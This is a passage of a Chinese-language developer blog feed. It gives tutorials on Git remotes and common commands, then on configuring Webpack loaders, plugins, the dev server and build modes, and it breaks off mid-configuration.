远程仓库</h1><p><strong>概念</strong>：托管在因特网或其他网络中的你的项目的版本库</p><p><strong>作用</strong>：保存版本库的历史记录，多人协作</p><p><strong>创建</strong>：公司自己服务器 &#x2F; 第三方托管平台（Gitee，GitLab，GitHub…）</p><p><strong>步骤</strong>：</p><ol><li>注册第三方托管平台网站账号</li><li>新建仓库得到远程仓库 Git 地址</li><li>本地 Git 仓库添加远程仓库原点地址</li></ol><ul><li><strong>命令</strong>：<code>git remote add 远程仓库别名 远程仓库地址</code></li><li>例如：<code>git remote add origin https://gitee.com/lidongxu/work.git</code></li></ul><ol start="4"><li>本地 Git 仓库推送版本记录到远程仓库</li></ol><ul><li>命令：<code>git push -u 远程仓库别名 本地和远程分支名</code></li><li>例如：<code>git push -u origin master</code></li><li>完整写法：<code>git push --set-upstream origin master:master</code></li></ul><h2 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h2><p><strong>克隆</strong>：拷贝一个 Git 仓库到本地，进行使用</p><p><strong>命令</strong>：<code>git clone 远程仓库地址</code>，例如：<code>git clone https://gitee.com/lidongxu/work.git</code></p><p>效果：在运行命令所在文件夹，生成 work 项目文件夹（包含版本库，并映射到暂存区和工作区）</p><p>注意 :</p><ol><li>Git 本地仓库已经建立好和远程仓库的链接</li><li>仓库公开随意克隆，推送需要身为仓库团队成员</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529125801013.png" alt="image-20230529125801013.png"></p><h2 id="多人协同开发"><a href="#多人协同开发" class="headerlink" title="多人协同开发"></a>多人协同开发</h2><p>步骤：</p><ol><li>小传开发代码 -&gt; 工作区 -&gt; 暂存区 -&gt; 提交 -&gt; 拉取（可选）-&gt; 推送</li><li>小智 -&gt; 拉取（后续也可以开发代码 -&gt; … -&gt; 推送）</li><li>想要看到别人同步上去的最新内容：<code>git pull origin master</code> 等价于</li></ol><ul><li><code>git fetch origin master:master</code>（获取远程分支记录到本地，未合并）</li><li><code>git merge origin/master</code> (把远程分支记录合并到所在分支下）</li></ul><h1 id="在VSCode中使用Git"><a href="#在VSCode中使用Git" class="headerlink" title="在VSCode中使用Git"></a>在VSCode中使用Git</h1><p>使用：源代码管理，进行暂存，撤销，对比差异，提交等操作</p><p>注意：VSCode 打开的项目文件夹下需要有 .git 仓库</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230529130105619.png" alt="image-20230529130105619.png"></p><h1 id="Git-常用命令"><a href="#Git-常用命令" class="headerlink" title="Git 常用命令"></a>Git 常用命令</h1><table><thead><tr><th><strong>命令</strong></th><th><strong>作用</strong></th><th><strong>注意</strong></th></tr></thead><tbody><tr><td>git -v</td><td>查看 git 版本</td><td></td></tr><tr><td>git init</td><td>初始化 git 仓库</td><td></td></tr><tr><td>git add 文件标识</td><td>暂存某个文件</td><td>文件标识以终端为起始的相对路径</td></tr><tr><td>git add .</td><td>暂存所有文件</td><td></td></tr><tr><td>git commit -m ‘说明注释’</td><td>提交产生版本记录</td><td>每次提交，把暂存区内容快照一份</td></tr><tr><td>git status</td><td>查看文件状态 - 详细信息</td><td></td></tr><tr><td>git status -s</td><td>查看文件状态 - 简略信息</td><td>第一列是暂存区状态，第二列是工作区状态</td></tr><tr><td>git ls-files</td><td>查看暂存区文件列表</td><td></td></tr><tr><td>git restore 文件标识</td><td>从暂存区恢复到工作区</td><td>如果文件标识为 . 则恢复所有文件</td></tr><tr><td>git rm –cached 文件标识</td><td>从暂存区移除文件</td><td>不让 git 跟踪文件变化</td></tr><tr><td>git log</td><td>查看提交记录 - 详细信息</td><td></td></tr><tr><td>git log –oneline</td><td>查看提交记录 - 简略信息</td><td>版本号 分支指针 提交时说明注释</td></tr><tr><td>git reflog –oneline</td><td>查看完整历史 - 简略消息</td><td>包括提交，切换，回退等所有记录</td></tr><tr><td>git reset 版本号</td><td>切换版本代码到暂存区和工作区</td><td>–soft 模式保留暂存区和工作区原本内容<br>–hard 模式不保留暂存区和工作区原本内容<br>–mixed 模式不保留暂存区，工作区保留（默认）<br>先覆盖到暂存区，再用暂存区对比覆盖工作区</td></tr><tr><td>git branch 分支名</td><td>创建分支</td><td></td></tr><tr><td>git branch</td><td>查看本地分支</td><td></td></tr><tr><td>git branch -d 分支名</td><td>删除分支</td><td>请确保记录已经合并到别的分支下，再删除分支</td></tr><tr><td>git checkout 分支名</td><td>切换分支</td><td></td></tr><tr><td>git checkout -b 分支名</td><td>创建并立刻切换分支</td><td></td></tr><tr><td>git merge 分支名</td><td>把分支提交历史记录合并到当前所在分支</td><td></td></tr><tr><td>git remote add 远程仓库别名 远程仓库地址</td><td>添加远程仓库地址</td><td>别名唯一，地址是 .git 结尾的网址</td></tr><tr><td>git remote -v</td><td>查看远程仓库地址</td><td></td></tr><tr><td>git remote remove 远程仓库别名</td><td>删除远程仓库地址</td><td></td></tr><tr><td>git pull 远程仓库别名 分支名</td><td>拉取</td><td>完整写法：git pull 远程仓库别名 远程分支名:本地分支名 等价于：git fetch 和 git merge</td></tr><tr><td>git push 远程仓库别名 分支名</td><td>推送</td><td>完整写法：git push 远程仓库别名 本地分支名:远程分支名 -u：建立通道后以后可以简写 git push</td></tr><tr><td>git pull –rebase 远程仓库别名 分支名</td><td>拉取合并</td><td>合并没有关系的记录</td></tr><tr><td>git clone 远程仓库地址</td><td>克隆</td><td>从0得到一个远程的Git仓库到本地使用</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack</title>
      <link href="/2024/03/21/Webpack/"/>
      <url>/2024/03/21/Webpack/</url>
      
        <content type="html"><![CDATA[<h1 id="Webpack简介"><a href="#Webpack简介" class="headerlink" title="Webpack简介"></a>Webpack简介</h1><p><strong>定义</strong>：<a href="https://webpack.docschina.org/concepts/">Webpack</a>是一个用于现代JavaScript应用程序的<strong>静态模块打包工具</strong>。当 webpack 处理应用程序时，它会在内部从一个或多个入口点构建一个 依赖图(dependency graph)，然后将你项目中所需的每一个模块组合成一个或多个 _bundles_，它们均为静态资源，用于展示你的内容。</p><p><strong>静态模块</strong>：指的是编写代码过程中的，html，css，js，图片等固定内容的文件 </p><p><strong>打包</strong>：把静态模块内容，压缩，整合，转译等（前端工程化） </p><ul><li>把 less &#x2F; sass 转成 css 代码</li><li>把 ES6+ 降级成 ES5</li><li>支持多种模块标准语法</li></ul><p><strong>步骤</strong>：</p><ol><li>新建项目文件夹，初始化包环境，得到package.json文件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure><ol start="2"><li>新建 src 源代码文件夹（书写代码）包括 utils&#x2F;check.js 封装用户名和密码长度函数，引入到 src&#x2F;index.js 进行使用</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/utils/check.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">checkPhone</span> = phone =&gt; phone.<span class="property">length</span> === <span class="number">11</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">checkCode</span> = code =&gt; code.<span class="property">length</span> === <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// src/index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; checkPhone, checkCode &#125; <span class="keyword">from</span> <span class="string">&quot;./utils/check.js&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">checkPhone</span>(<span class="string">&#x27;15800000000&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">checkCode</span>(<span class="string">&#x27;1234567&#x27;</span>));</span><br></pre></td></tr></table></figure><ol start="3"><li>下载webpack webpack-cli到项目中，做版本独立</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i webpack webpack-cli --save-dev</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：虽然 webpack 是全局软件包，封装的是命令工具，但是为了保证项目之间版本分别独立，所以这次比较特殊，下载到某个项目环境下，但是需要把 webpack 命令配置到 package.json 的 scripts 自定义命令，作为局部命令使用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json中添加</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>项目中，运行命令，采用自定义命令的方式（局部命令）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><ol start="5"><li>会自动生成dist分发文件夹（压缩和优化后，用于最终运行的代码）</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230403111445196.png" alt="image-20230403111445196.png"></p><h1 id="Webpack打包入口和出口"><a href="#Webpack打包入口和出口" class="headerlink" title="Webpack打包入口和出口"></a>Webpack打包入口和出口</h1><p><a href="https://webpack.docschina.org/concepts/#entry">Webpack 配置</a>：影响 Webpack 打包过程和结果 </p><p><strong>步骤</strong>： </p><ol><li>项目根目录，新建 webpack.config.js 配置文件 </li><li>导出配置对象，配置入口，出口文件的路径</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;my-first-webpack.bundle.js&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>默认使用CommonJS标准</li><li>entry：入口，表示webpack 应该使用哪个模块，来作为构建其内部依赖图的开始</li><li>output：出口，webpack 在哪里输出它所创建的 bundle，以及如何命名这些文件。</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240320200800.png" alt="image.png"></p><p><strong>注意</strong>：只有和入口产生直接&#x2F;间接的引入关系，才会被打包</p><h1 id="Webpack自动生成html文件"><a href="#Webpack自动生成html文件" class="headerlink" title="Webpack自动生成html文件"></a>Webpack自动生成html文件</h1><p>插件 <a href="https://webpack.docschina.org/plugins/html-webpack-plugin/">html-webpack-plugin</a>： 在 Webpack 打包时生成 html 文件 </p><p>步骤： </p><ol><li>下载 html-webpack-plugin 本地软件包</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i html-webpack-plungin --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>配置 webpack.config.js 让 Webpack 拥有插件功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入插件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// 在这里配置</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">template</span>: <span class="string">&#x27;./public/login.html&#x27;</span>, <span class="comment">// 模板文件</span></span><br><span class="line">      <span class="attr">filename</span>: <span class="string">&#x27;./login/index.html&#x27;</span> <span class="comment">// 输出文件</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321105853.png" alt="image.png"></p><h1 id="Webpack-打包css代码"><a href="#Webpack-打包css代码" class="headerlink" title="Webpack-打包css代码"></a>Webpack-打包css代码</h1><p><strong>注意</strong>：Webpack 默认只识别 JS 和 JSON 文件内容，所以想要让 Webpack 识别更多不同内容，需要使用加载器</p><ul><li><a href="https://webpack.docschina.org/loaders/css-loader/">加载器 css-loader</a>：解析 css 代码</li><li><a href="https://webpack.docschina.org/loaders/style-loader/">加载器 style-loader</a>：把解析后的 css 代码插入到 DOM（style 标签之间）</li></ul><p><strong>步骤</strong>：</p><ol><li>准备 css 文件引入到 src&#x2F;login&#x2F;index.js 中（压缩转译处理等）</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 准备 css 代码，并引入到 js 中</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;bootstrap/dist/css/bootstrap.min.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./index.css&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>注意：这里只是引入代码内容让 Webpack 处理，不需定义变量接收在 JS 代码中继续使用，所以没有定义变量接收</li></ul><ol start="2"><li>下载 css-loader 和 style-loader 本地软件包</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i css-loader style-loader --save-dev</span><br></pre></td></tr></table></figure><ol start="3"><li>配置 webpack.config.js 让 Webpack 拥有该加载器功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">module</span>: &#123; <span class="comment">// 加载器</span></span><br><span class="line"><span class="attr">rules</span>: [ <span class="comment">// 规则列表</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/\.css$/i</span>, <span class="comment">// 匹配 .css 结尾的文件</span></span><br><span class="line"><span class="attr">use</span>: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>], <span class="comment">// 使用从后到前的加载器来解析 css 代码和插入到 DOM</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321125904.png" alt="image.png"></p><h2 id="优化-提取css代码"><a href="#优化-提取css代码" class="headerlink" title="优化-提取css代码"></a>优化-提取css代码</h2><p>插件 <a href="https://webpack.docschina.org/plugins/mini-css-extract-plugin/">mini-css-extract-plugin</a>：提取 css 代码 </p><p><strong>步骤</strong>： </p><ol><li>下载 mini-css-extract-plugin 本地软件包</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save-dev mini-css-extract-plugin</span><br></pre></td></tr></table></figure><ol start="2"><li>配置 webpack.config.js 让 Webpack 拥有该插件功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MiniCssExtractPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;mini-css-extract-plugin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">module</span>: &#123; <span class="comment">// 加载器</span></span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="comment">// use: [&#x27;style-loader&#x27;, &#x27;css-loader&#x27;]</span></span><br><span class="line">        <span class="attr">use</span>: [<span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>, <span class="string">&quot;css-loader&quot;</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>()</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：不能和 style-loader 一起使用 </p><p><strong>好处</strong>：css 文件可以被浏览器缓存，减少 js 文件体积，让浏览器并行下载css和js文件</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240321133318.png" alt="image.png"></p><h2 id="优化-压缩过程"><a href="#优化-压缩过程" class="headerlink" title="优化-压缩过程"></a>优化-压缩过程</h2><p>css代码提取之后，后面有一些没有被压缩</p><p>使用 <a href="https://webpack.docschina.org/plugins/css-minimizer-webpack-plugin/">css-minimizer-webpack-plugin</a> 插件 </p><p><strong>步骤</strong>： </p><ol><li>下载 css-minimizer-webpack-plugin 本地软件包</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i css-minimizer-webpack-plugin --save-dev </span><br></pre></td></tr></table></figure><ol start="2"><li>配置 webpack.config.js 让 webpack 拥有该功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">CssMinimizerPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;css-minimizer-webpack-plugin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 优化</span></span><br><span class="line">  <span class="attr">optimization</span>: &#123;</span><br><span class="line">    <span class="comment">// 最小化</span></span><br><span class="line">    <span class="attr">minimizer</span>: [</span><br><span class="line">      <span class="comment">// 在 webpack@5 中，你可以使用 `...` 语法来扩展现有的 minimizer（即 </span></span><br><span class="line">      <span class="comment">// `terser-webpack-plugin`），将下一行取消注释（保证 JS 代码还能被压缩处理）</span></span><br><span class="line">      <span class="string">`...`</span>,</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">CssMinimizerPlugin</span>(),</span><br><span class="line">    ],</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Webpack-打包less代码"><a href="#Webpack-打包less代码" class="headerlink" title="Webpack-打包less代码"></a>Webpack-打包less代码</h1><p><a href="https://webpack.docschina.org/loaders/less-loader/">加载器 less-loader</a>：把 less 代码编译为 css 代码 </p><p><strong>步骤</strong>： </p><ol><li>新建 less 代码（设置背景图）并引入到 src&#x2F;login&#x2F;index.js 中</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./index.less&#x27;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>下载 less 和 less-loader 本地软件包</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i less less-loader --save-dev</span><br></pre></td></tr></table></figure><ol start="3"><li>配置 webpack.config.js 让 Webpack 拥有功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.less$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>, <span class="string">&quot;css-loader&quot;</span>, <span class="string">&quot;less-loader&quot;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：less-loader 需要配合 less 软件包使用</p><h1 id="Webpack-打包图片"><a href="#Webpack-打包图片" class="headerlink" title="Webpack-打包图片"></a>Webpack-打包图片</h1><p><a href="https://webpack.docschina.org/guides/asset-modules/">资源模块</a>：Webpack5 <strong>内置</strong>资源模块（字体，图片等）打包，无需额外 loader </p><p><strong>步骤</strong>： </p><ol><li>配置 webpack.config.js 让 Webpack 拥有打包图片功能</li></ol><ul><li>占位符 【hash】对模块内容做算法计算，得到映射的数字字母组合的字符串</li><li>占位符 【ext】使用当前模块原本的占位符，例如：<code>.png / .jpg</code> 等字符串</li><li>占位符 【query】保留引入文件时代码中查询参数（只有 URL 下生效）</li></ul><ol start="2"><li>注意：判断临界值默认为 8KB</li></ol><ul><li>大于 8KB 文件：发送一个单独的文件并导出 URL 地址</li><li>小于 8KB 文件：导出一个 data URI（base64字符串）</li></ul><ol start="3"><li>在 src&#x2F;login&#x2F;index.js 中给 img 标签添加 logo 图片</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 img 标签并动态添加到页面</span></span><br><span class="line"><span class="comment">// 注意：js 中引入本地图片资源要用 import 方式（如果是网络图片http地址，字符串可以直接写）</span></span><br><span class="line"><span class="keyword">import</span> imgObj <span class="keyword">from</span> <span class="string">&#x27;./assets/logo.png&#x27;</span></span><br><span class="line"><span class="keyword">const</span> theImg = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>)</span><br><span class="line">theImg.<span class="property">src</span> = imgObj</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.login-wrap&#x27;</span>).<span class="title function_">appendChild</span>(theImg)</span><br></pre></td></tr></table></figure><ol start="4"><li>配置 webpack.config.js 让 Webpack 拥有打包图片功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.(png|jpg|jpeg|gif)$/i</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;asset&#x27;</span>,</span><br><span class="line">        <span class="attr">generator</span>: &#123;</span><br><span class="line">          <span class="attr">filename</span>: <span class="string">&#x27;assets/[hash][ext][query]&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Webpack-搭建开发环境"><a href="#Webpack-搭建开发环境" class="headerlink" title="Webpack-搭建开发环境"></a>Webpack-搭建开发环境</h1><p>问题：之前改代码，需重新打包才能运行查看，效率很低 </p><p><a href="https://webpack.docschina.org/guides/development/">开发环境</a>：配置 webpack-dev-server 快速开发应用程序 </p><p>作用：启动 Web 服务，自动检测代码变化，热更新到网页 </p><p>注意：dist 目录和打包内容是在内存里（更新快） </p><p>步骤： </p><ol><li>下载 webpack-dev-server 软件包到当前项目</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i webpack-dev-server --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>设置模式为开发模式，并配置自定义命令</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span> <span class="comment">// 打包模式：development开发模式-使用相关内置优化</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="string">&quot;dev&quot;</span>: <span class="string">&quot;webpack serve --mode=development&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 npm run dev 来启动开发服务器，试试热更新效果</li></ol><p><strong>注意</strong>：</p><ol><li>webpack-dev-server借助http模块创建8080默认web服务</li><li>默认以public文件夹作为服务器根目录</li><li>webpack-dev-server根据配置，打包相关代码在内存当中，以output.path的值作为服务器根目录（所以可以直接自己拼接访问dist目录下的内容）</li></ol><h1 id="Webpack-打包模式"><a href="#Webpack-打包模式" class="headerlink" title="Webpack-打包模式"></a>Webpack-打包模式</h1><p><a href="https://webpack.docschina.org/configuration/mode/">打包模式</a>：告知 Webpack 使用相应模式的内置优化</p><p><strong>分类</strong>：</p><table><thead><tr><th><strong>模式名称</strong></th><th><strong>模式名字</strong></th><th><strong>特点</strong></th><th>场景</th></tr></thead><tbody><tr><td>开发模式</td><td>development</td><td>调试代码，实时加载，模块热替换等</td><td>本地开发</td></tr><tr><td>生产模式</td><td>production</td><td>压缩代码，资源优化，更轻量等</td><td>打包上线</td></tr></tbody></table><p><strong>设置</strong>：</p><ul><li>方式1：在 webpack.config.js 配置文件设置 mode 选项</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">mode</span>: 